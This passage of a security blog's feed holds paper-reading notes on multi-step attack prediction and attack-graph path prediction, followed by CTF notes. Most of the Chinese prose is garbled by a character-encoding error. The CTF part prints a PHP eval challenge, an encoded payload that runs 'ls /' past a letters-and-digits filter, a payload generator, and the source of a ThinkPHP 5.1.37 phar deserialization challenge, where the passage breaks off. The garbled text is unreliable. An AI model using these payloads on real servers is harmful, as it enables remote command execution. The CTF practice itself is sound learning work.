Techniques</h3><p>è¿™ä¸€éƒ¨åˆ†å°±æ¯”è¾ƒå¤§äº†ï¼Œåˆ†å¤§ç±»å¯ä»¥åˆ†ä¸ºç›‘ç£å’Œæ— ç›‘ç£ç”šè‡³åŠç›‘ç£æ–¹æ³•ã€‚ä½œè€…ä»…è®¨è®ºäº†ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li>Support Vector Machine<br>æ”¯æŒå‘é‡æœºï¼ˆSVMï¼‰æ˜¯ä¸€ç§ç›‘ç£æ¨¡å‹ï¼Œä¸»è¦ç”¨äºæ•°æ®åˆ†ç±»ï¼Œä¼ ç»Ÿçš„SVMé€‚ç”¨äºå¸¦æ ‡ç­¾çš„æ•°æ®ã€‚ä½†å¯¹äºæ— æ ‡ç­¾çš„æ•°æ®ï¼Œå¯ä»¥åˆ©ç”¨One-Class SVMæ¥è§£å†³ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¼ ç»ŸSVMå¯ä»¥è€ƒè™‘ä½¿ç”¨Robust-SVMæ¥æ›¿æ¢æ¨¡å‹ä»¥è¿½æ±‚æ›´åŠ ç¨³å®šçš„å®éªŒæ•ˆæœã€‚<br>SVMå·²è¢«è¯æ˜æ˜¯ç”¨äºå…¥ä¾µæ£€æµ‹å’Œé¢„æµ‹æœ€ä¸ºæˆåŠŸçš„æ•°æ®æŒ–æ˜æŠ€æœ¯ï¼Œå®ƒä¸ç¥ç»ç½‘ç»œå’Œå†³ç­–æ ‘ç›¸æ¯”ï¼Œå…·æœ‰æ›´ä½çš„è¯¯æŠ¥ç‡å’Œæ›´é«˜çš„é¢„æµ‹ç²¾å‡†åº¦ï¼ŒåŒæ—¶å¯¹äºè¾“å…¥æ•°æ®ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¤šé™åˆ¶è¦æ±‚ã€‚ä½†SVMçš„ç¼ºç‚¹æ˜¯å…¶ä¸èƒ½å¤Ÿæœ‰æ•ˆåœ°å®æ—¶å¤„ç†æ•°æ®ï¼Œé™¤æ­¤ä¹‹å¤–å®ƒæ›´å¤šåœ°é€‚ç”¨äºæ•°å­—æ•°æ®ï¼Œè€Œå¯¹äºéæ•°å­—æ•°æ®çš„å¤„ç†æ•ˆæœå¹¶ä¸ä½³ã€‚</li><li>Decision Trees<br>å†³ç­–æ ‘æ˜¯ä¸€ç§èƒ½å¤Ÿç»˜åˆ¶å†³ç­–åŠå…¶ç»“æœçš„æ ‘çŠ¶æ¨¡å‹ï¼Œåœ¨å†³ç­–æ ‘ä¸­ï¼Œå†…éƒ¨èŠ‚ç‚¹ä»£è¡¨äº†å¯¹å±æ€§çš„æµ‹è¯•ï¼Œè€Œåˆ†æ”¯ä»£è¡¨äº†è¯¥æµ‹è¯•çš„ç»“æœã€‚ç®€å•æ¥è¯´ï¼Œå†³ç­–æ ‘èƒ½å¤Ÿç»™å‡ºä¸åŒæƒ…å†µä¸‹ï¼ˆä¸åŒè·¯å¾„ä¸‹ï¼‰çš„é¢„æœŸå€¼ã€‚<br>å†³ç­–æ ‘é€šå¸¸é€šè¿‡éœ€è¦å¯»æ‰¾æ˜¾è‘—ç‰¹å¾æ¥åˆ†ææ•°æ®é›†å¹¶ä»ä¸­å¯»æ‰¾ç›¸å¯¹åº”çš„æ¨¡å¼æ¥é¢„æµ‹æ”»å‡»ï¼Œæ­£å› å¦‚æ­¤ï¼Œå®ƒèƒ½å¤Ÿå¤„ç†å¤§å‹æ•°æ®é›†ã€‚å®ƒèƒ½ä»çˆ¶èŠ‚ç‚¹åˆ°å­èŠ‚ç‚¹çš„è·¯å¾„è§„åˆ™æ¥å¯¹æ”»å‡»è¿›è¡Œåˆ†ç±»ï¼Œè¿™æ„å‘³ç€å†³ç­–æ ‘èƒ½å¤Ÿæœ‰åŠ©äºå¯¹ç½‘ç»œå…¥ä¾µè¿›è¡Œå®æ—¶ç›‘æ§ã€‚</li></ol><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>æœ€åï¼Œç®€å•çœ‹çœ‹ä½œè€…ç½—åˆ—å‡ºçš„ä¸åŒæ–¹æ³•çš„å¯¹æ¯”</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/a49e53fc-00e3-4fef-8f80-0c0093066d34.png"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0aa4213a-9807-43d9-a862-6bc42aa3e7b3.png"></p><p>å†™åœ¨æœ€åï¼Œä½œè€…è¡¨æ˜å…¶ä¸Šè¿°è®¨è®ºçš„æ‰€æœ‰ç®—æ³•éƒ½æ²¡æœ‰å……åˆ†è§£å†³â€œç¨€æœ‰æ•°æ®â€å’Œâ€œç¼ºå¤±æ•°æ®â€çš„é—®é¢˜ï¼Œè¿™ä¸¤ä¸ªé—®é¢˜ä¼šåœ¨æå¤§ç¨‹åº¦ä¸Šè¯¯å¯¼é¢„æµ‹çš„ç»“æœã€‚åœ¨â€œç¨€æœ‰æ•°æ®â€é—®é¢˜çš„æƒ…å†µä¸‹ï¼Œæ–¹æ³•å¯èƒ½ä¼šå€¾å‘äºæ•°æ®é›†ä¸­å‘ç”Ÿæ¬¡æ•°æœ€å¤šçš„æ”»å‡»ç±»å‹ï¼›åœ¨â€œç¼ºå¤±æ•°æ®â€é—®é¢˜çš„æƒ…å†µä¸‹ï¼Œç”±äºå¤šæ­¥éª¤æ”»å‡»çš„è¿è´¯æ€§ï¼Œå¾ˆæœ‰å¯èƒ½é¢„æµ‹æ²¡åŠæ³•è¿›è¡Œä¸‹å»ã€‚æ­¤å¤–ï¼Œæ›´å¤šçš„ç ”ç©¶å€¾å‘äºå¯¹äºå·²æœ‰çš„å…¥ä¾µæ•°æ®é›†è¿›è¡Œç ”ç©¶ï¼Œè€Œéæ˜¯çœŸå®ã€å®æ—¶çš„ç½‘ç»œç¯å¢ƒä¸­çš„æ•°æ®ã€‚å› æ­¤ï¼Œæœªæ¥åº”å½“é‡ç‚¹å…³æ³¨ä¸Šè¿°é—®é¢˜ï¼Œå¹¶è§£å†³ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Survey </tag>
            
            <tag> Multi-Step Attack Prediction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - A network attack path prediction method using attack graph</title>
      <link href="/2021/11/09/A%20network%20attack%20path%20prediction%20method%20using%20attack%20graph/"/>
      <url>/2021/11/09/A%20network%20attack%20path%20prediction%20method%20using%20attack%20graph/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šX Liu</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šA network attack path prediction method using attack graph</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.springer.com/article/10.1007/s12652-020-02206-5">https://link.springer.com/article/10.1007/s12652-020-02206-5</a></em></p><p><em>åŸæ–‡æ¥æºï¼šJAIHC 2020</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>æ­£å¦‚ä¹‹å‰ç¬”è®°ä¸­æ‰€è¯´è¿‡çš„ï¼Œç°åœ¨çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºå·²ç»ç”±ä¼ ç»Ÿå•ä¸€ç®€å•çš„æ”»å‡»æœºåˆ¶è½¬å˜ä¸ºå¤šé˜¶æ®µå¤šæ­¥éª¤å¤æ‚çš„æ”»å‡»æœºåˆ¶ã€‚è¿™é‡Œä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼ŒZeusåƒµå°¸ç½‘ç»œé€šè¿‡æ‰«ææ£€æµ‹ã€æº¢å‡ºæ”»å‡»ã€æ„ŸæŸ“ç›®æ ‡ã€ä¼ æ’­ç—…æ¯’åŠçªƒå–æ•°æ®äº”ä¸ªæ”»å‡»æ­¥éª¤/æ”»å‡»é˜¶æ®µå‘åŠ¨æ”»å‡»ï¼Œè¿™ä¼šé€ æˆä¸¥é‡ä¸”æ¶åŠ£çš„å½±å“ã€‚ç®€å•æ¥è¯´ï¼Œæ”»å‡»è·¯å¾„é¢„æµ‹çš„ç›®çš„æ˜¯é€šè¿‡å‘Šè­¦å…³è”åˆ†ææŠ€æœ¯åˆ†ææ”»å‡»è¡Œä¸ºï¼Œæ­éœ²è¿™äº›æ”»å‡»è¡Œä¸ºèƒŒåéšè—çš„é€»è¾‘ï¼Œè¿›è€Œæ„å»ºæ”»å‡»åœºæ™¯ï¼Œæœ€ç»ˆæ¨æ–­å‡ºæ”»å‡»è€…çš„åç»­æ”»å‡»æ­¥éª¤ï¼Œå®ç°åŠæ—¶å‘ç°ä¸»åŠ¨é˜²å¾¡ã€‚</p><p>æ”»å‡»è·¯å¾„é¢„æµ‹çš„å…³é”®ä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ol><li>äº†è§£å½“å‰çš„æ”»å‡»è¡Œä¸º</li><li>é¢„æµ‹æ”»å‡»è€…å¯èƒ½ä¼šé‡‡ç”¨çš„æ”»å‡»è·¯å¾„</li></ol><p>åŸºäºä¸Šè¿°æƒ³æ³•ï¼Œä½œè€…æå‡ºäº†ä¸€ç§åŸºäºæ”»å‡»å›¾çš„æ”»å‡»è·¯å¾„é¢„æµ‹æ–¹æ³•ï¼Œå¹¶å°è¯•ç”¨æ”»å‡»å›¾æ¥æè¿°å…¥ä¾µè¡Œä¸ºçš„èŠ‚ç‚¹ä¹‹é—´çš„ä¼ é€’å…³ç³»ï¼Œæ˜ å°„å‡ºä»æŸä¸€ä¸»æœºæˆ–æ¼æ´è¿›è¡Œæ”»å‡»çš„æœ€å¤§å¯èƒ½æ€§ï¼Œè¿›è€Œç½‘ç»œå„æ”»å‡»è·¯å¾„ä¸‹çš„å…¥ä¾µæƒ…å†µï¼Œå¹¶æ ¹æ®æ£€æµ‹ç»“æœæ„å»ºç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹ã€‚</p><h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><pre><code>æ–‡ä¸­æ¶‰åŠå¤§é‡å…¬å¼æ¨ç†ï¼Œè¯»è€…ä»…ä½œç®€è¦æ¦‚è¿°ï¼Œå¦‚æ„Ÿå…´è¶£è¯·è‡³åŸæ–‡ä¸­æŸ¥çœ‹</code></pre><p><strong>ç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹</strong><br>åœ¨æ„å»ºç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹çš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆåŸºäºæ”»å‡»å›¾ç†è®ºå®šä¹‰äº†ç½‘ç»œæ”»å‡»å›¾ï¼Œé€šè¿‡æ£€æµ‹æ”»å‡»è€…åœ¨å½“å‰æ—¶é—´èŠ‚ç‚¹çš„æƒé™çŠ¶æ€ï¼Œè·å–ç½‘ç»œè¿æ¥çŸ©é˜µï¼Œå¾—åˆ°æ”»å‡»è€…ä½¿ç”¨çš„æ¼æ´ã€æ”»å‡»æ•ˆæœå’Œæ”»å‡»æ¡ä»¶çš„æè¿°ï¼Œè¿›è€Œæ„å»ºç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹ã€‚</p><p><strong>æ”»å‡»æ„å›¾é¢„æµ‹å’Œä¼˜åŒ–</strong><br>åœ¨ä¼˜åŒ–å’Œé¢„æµ‹ç½‘ç»œä¸­å¼‚å¸¸ä¿¡æ¯çš„æ”»å‡»æ„å›¾çš„è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®ä¸»æœºä¹‹é—´çš„è¿æ¥å…³ç³»å®šä¹‰æ”»å‡»è·¯å¾„å›¾ï¼Œè®¡ç®—æ”»å‡»æ„å›¾çš„å¯è¾¾æ€§å’Œå®ç°çš„å¯èƒ½æ€§ï¼Œå¾—åˆ°æ”»å‡»æ„å›¾çš„æœ€çŸ­è·¯å¾„ï¼Œè¿›è€Œä¼˜åŒ–å’Œé¢„æµ‹ç½‘ç»œä¸­å¼‚å¸¸ä¿¡æ¯çš„æ”»å‡»æ„å›¾</p><p><strong>åŸºäºå…¥ä¾µæ¦‚ç‡çš„ç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹</strong><br>åœ¨æ„å»ºç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹çš„è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®é¢„å®šä¹‰çš„æ”»å‡»æ ‡å‡†ï¼Œå¯¹ç½‘ç»œä¸­å­˜åœ¨çš„æ¼æ´çš„å„ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼ï¼Œæ£€æµ‹æ”»å‡»è€…èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´è¿›è¡Œå…¥ä¾µçš„æ¦‚ç‡ã€æ”»å‡»è€…è·å¾—é«˜æƒé™çš„æ¦‚ç‡ä»¥åŠå®ç°æ”»å‡»æ„å›¾çš„æ¦‚ç‡ï¼Œæœ€åå¾—æ”»å‡»è€…åœ¨ç½‘ç»œä¸­å„ä¸ªæ”»å‡»è·¯å¾„ä¸‹èƒ½å¤Ÿè¿›è¡Œå…¥ä¾µçš„æœ€å¤§å¯èƒ½æ€§çš„é‚£ä¸€æ¡æ”»å‡»è·¯å¾„ï¼Œè¿›è¡Œåç»­æ£€æµ‹ï¼ˆå½“ç„¶è¿™éƒ¨åˆ†æ˜¯å»ºç«‹åœ¨ç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹çš„åŸºç¡€ä¸Šå®ç°çš„ï¼‰ã€‚</p><h2 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><p>ä½œè€…ä¸ºäº†éªŒè¯æƒ³æ³•ï¼Œæ„å»ºäº†ä¸€å¥—ç¯å¢ƒç”¨äºå®ç°ï¼Œæ‹“æ‰‘å›¾å¦‚ä¸‹</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/398f0df6-4859-4ed8-a21a-dcca85b35d51.png"></p><p>å¤–ç½‘ç”¨æˆ·ï¼ˆæ”»å‡»è€…ï¼‰å¯ä»¥é€šè¿‡äº’è”ç½‘è®¿é—®è¯¥ç½‘ç»œï¼Œå®éªŒç½‘ç»œæ€»å…±åˆ†ä¸ºå››ä¸ªåŒºåŸŸï¼šDMZåŒºã€å­ç½‘1ã€å­ç½‘2ã€å­ç½‘3ã€‚è®¿é—®æ§åˆ¶è®¾ç½®å¦‚ä¸‹ï¼šDMZåŒºåŒ…å«WebæœåŠ¡å™¨å’ŒEmailæœåŠ¡å™¨ï¼Œç”±é˜²ç«å¢™1ä¿æŠ¤å¹¶ä¸äº’è”ç½‘äº’è”ï¼Œä¸”åªèƒ½è®¿é—®ä¸»æœº1ã€å­ç½‘2çš„æ–‡ä»¶æœåŠ¡å™¨å’Œå­ç½‘3çš„æ•°æ®åº“æœåŠ¡å™¨ï¼›å­ç½‘1çš„ä¸»æœº1å¯ä»¥è®¿é—®å­ç½‘2å’Œå­ç½‘3çš„æ‰€æœ‰æœºå™¨ï¼Œä¸»æœº3åªèƒ½è®¿é—®ä¸»æœº1å’Œæ•°æ®åº“æœåŠ¡å™¨ï¼Œä¸»æœº2åªèƒ½è®¿é—®ä¸»æœº3ï¼›å·¥ä½œç«™2å¯ä»¥è®¿é—®æ•°æ®åº“æœåŠ¡å™¨å’Œæ–‡ä»¶æœåŠ¡å™¨ã€‚</p><p>ç„¶åä½œè€…ä¸å¦å¤–ä¸¤ç§æ¨¡å‹æ£€æµ‹åˆ°çš„æ¼æ´é£é™©ã€èŠ‚ç‚¹æ”»å‡»è·¯å¾„æ£€æµ‹çš„ç²¾ç¡®åº¦å’Œå¯é æ€§è¿›è¡Œäº†æ¯”è¾ƒï¼Œæœ€åè¿˜å¯¹æ¯”äº†å…¶è¯¯æŠ¥ç‡ï¼Œæ€»ä½“æƒ…å†µå¦‚ä¸‹å›¾</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/527e9887-52dd-44af-bfae-20fdb36e4222.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>ä½œè€…æå‡ºäº†ä¸€ç§åŸºäºæ”»å‡»å›¾çš„æ”»å‡»æ„å›¾é¢„æµ‹æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºåŸºäºæ”»å‡»å›¾çš„æ”»å‡»è·¯å¾„é¢„æµ‹æ–¹æ³•ã€‚è¯¥æ–¹æ³•ç”¨æ”»å‡»è·¯å¾„å›¾æ¥æè¿°å…¥ä¾µè¡Œä¸ºèŠ‚ç‚¹ä¹‹é—´çš„ä¼ é€’å…³ç³»ï¼Œä»è€Œæ˜ å°„å‡ºä»ä¸»æœº/æ¼æ´è¿›è¡Œæ”»å‡»çš„æœ€å¤§å¯èƒ½æ€§ï¼Œè¿›ä¸€æ­¥æ¢³ç†å¾—åˆ°ç½‘ç»œä¸­å„æ”»å‡»è·¯å¾„ä¸‹çš„å…¥ä¾µæƒ…å†µï¼Œå¹¶æ ¹æ®è¿™ä¸ªæƒ…å†µæ„å»ºç½‘ç»œæ”»å‡»èŠ‚ç‚¹è·¯å¾„æ£€æµ‹æ¨¡å‹ã€‚</p><p>è¯»è€…åœ¨è¯»å®Œæ•´ç¯‡æ–‡ç« åï¼Œä¸»è¦æœ‰ä¸€ä¸ªé—®é¢˜ï¼šåœ¨æè¿°æ”»å‡»å›¾å®šä¹‰é‚£éƒ¨åˆ†ï¼Œä½œè€…å†™é“ï¼šâ€œåœ¨ç½‘ç»œèŠ‚ç‚¹æ”»å‡»è·¯å¾„æ£€æµ‹çš„è¿‡ç¨‹ä¸­ï¼Œè·¯ç”±å™¨ä¼šä»¥ä¸€å®šçš„æ¦‚ç‡æ£€æµ‹è‡ªå·±çš„åœ°å€ä¿¡æ¯ï¼Œå¹¶è®¡ç®—å‡ºè·¯ç”±å™¨æ£€æµ‹æ•°æ®åŒ…ä¿¡æ¯çš„æ¦‚ç‡ï¼Œä»è€Œæ ¹æ®è¿™ä¸ªè®¡ç®—ç»“æœç¡®å®šç½‘ç»œå…¥ä¾µä¸­çš„æ”»å‡»è·¯å¾„â€ã€‚å¯¹äºè¿™éƒ¨åˆ†ï¼Œè¯»è€…æ¯”è¾ƒè¿·æƒ‘çš„æ˜¯ä¸ºä»€ä¹ˆè·¯ç”±å™¨æ£€æµ‹è‡ªå·±åœ°å€ä¿¡æ¯ç»“åˆæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯å¯ä»¥ç¡®å®šç½‘ç»œå…¥ä¾µçš„æ”»å‡»è·¯å¾„ï¼Œä¸åº”è¯¥æ˜¯ä»ä¸€äº›å¼‚å¸¸æ•°æ®åŒ…ä¸­æ’æŸ¥å‡ºè·¯ç”±ä¿¡æ¯è¿›è€Œç¡®å®šæ”»å‡»è·¯å¾„ä¹ˆï¼Œè¿™é‡Œçš„æè¿°æ¯”è¾ƒè¿·æƒ‘ã€‚ä½†æ€»çš„æ¥è¯´ï¼Œè¿™ç¯‡æ–‡ç« ä»ç½‘ç»œèŠ‚ç‚¹å…³è”æ”»å‡»è·¯å¾„å‡ºå‘ï¼Œé‡ç‚¹å…³æ³¨å¯è¢«æ”»å‡»è€…åˆ©ç”¨åˆ°çš„æ¼æ´/ä¸»æœºï¼Œå¯¹å…¶è¿›è¡Œè¯„ä¼°ï¼Œè¿›è€Œç¡®å®šå„æ¡æ”»å‡»è·¯å¾„çš„å¯èƒ½æ€§ï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„æƒ³æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAIHC&#39;20 </tag>
            
            <tag> Attack Path Prediction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - CTF Notes</title>
      <link href="/2021/11/08/CTF%20Notes/"/>
      <url>/2021/11/08/CTF%20Notes/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>ä»é›¶å¼€å§‹çš„CTFå¤å¥ç»ƒä¹ </em></p><p><em>æŒç»­æ›´æ–°ç›´åˆ°ä¸å­¦ä¹ å®‰å…¨é‚£å¤©</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p><p><em>æœ€åä¸€æ¬¡æ›´æ–°äº2021-11-08</em></p></blockquote><h2 id="æ— å­—æ¯ã€æ•°å­—ã€-çš„evalæ‰§è¡Œ"><a href="#æ— å­—æ¯ã€æ•°å­—ã€-çš„evalæ‰§è¡Œ" class="headerlink" title="æ— å­—æ¯ã€æ•°å­—ã€_çš„evalæ‰§è¡Œ"></a>æ— å­—æ¯ã€æ•°å­—ã€_çš„evalæ‰§è¡Œ</h2><p><code>index.php</code>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">20</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¾ˆå¸¸è§„ï¼Œåªæ˜¯é™åˆ¶é•¿åº¦æçš„æˆ‘å¾ˆéš¾å—ï¼Œä¸€å¼€å§‹åªæƒ³åˆ°äº†ç”¨<code>$&#123;&#125;</code>æ„é€ <code>$_GET</code>ï¼Œä½†æ˜¯ç”±äºé•¿åº¦é™åˆ¶ï¼Œæƒ³æ‹¿flagå¿…é¡»è¦æ„é€ ä¸¤æ¬¡ï¼Œç„¶ååˆ†åˆ«å¡«å…¥å‡½æ•°åå’Œå‚æ•°ï¼Œå…‰æ˜¯æ„é€ å‡½æ•°<code>$&#123;~%22%A0%B8%BA%AB%22&#125;[%AA]();</code>å·²ç»å ç”¨äº†16ä¸ªå­—ç¬¦ï¼Œåœ¨4ä¸ªå­—ç¬¦é‡ŒæŒ‡å®š<code>flag.php</code>æ˜¯ä¸ç°å®çš„ã€‚</p><p>åœ¨hxdçš„æç¤ºä¸‹ï¼Œå¯ä»¥ç›´æ¥å–åæ„é€ å‡½æ•°å’Œå–åæ„é€ å‚æ•°ï¼Œäºæ˜¯æ„é€ <code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code>ï¼Œç¿»è¯‘å›æ¥æ˜¯system(&quot;ls /&quot;)çš„æ„æ€ï¼Œè¿™é‡Œæ³¨æ„<strong>å¯ä»¥ä¸å¸¦å¼•å·ç©</strong></p><p>ç”¨äºç”Ÿæˆpayloadçš„phpè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># evalï¼Œæ— æ•°å­—å­—æ¯ä¸‹åˆ’çº¿æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="variable">$func</span> = urlencode(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = urlencode(~<span class="string">&quot;ls /&quot;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;(~<span class="subst">$func</span>)(~<span class="subst">$cmd</span>);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨pharè§¦å‘TP5-1-37çš„ååºåˆ—åŒ–"><a href="#åˆ©ç”¨pharè§¦å‘TP5-1-37çš„ååºåˆ—åŒ–" class="headerlink" title="åˆ©ç”¨pharè§¦å‘TP5.1.37çš„ååºåˆ—åŒ–"></a>åˆ©ç”¨pharè§¦å‘TP5.1.37çš„ååºåˆ—åŒ–</h2><p>æºç ï¼šs=index/index/hello</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;è¿™éƒ¨åˆ†æ˜¯å‰ç«¯&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = base64_encode(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            parse_str(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            extract(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = base64_decode(<span class="variable">$hello</span>);</span><br><span class="line">        file_put_contents(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (file_get_contents(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–+ä¸€ä¸ªæŒ‡å®šåç¼€åæ–‡ä»¶çš„å†™å…¥ã€‚é€šè¿‡å†™å…¥pharåŒ…ï¼Œåˆ©ç”¨phar://è¯»å–è§¦å‘ååºåˆ—åŒ–ï¼Œç»“åˆTP5.1.37çš„ååºåˆ—åŒ–æ¼æ´è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</p><p>tp5137.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 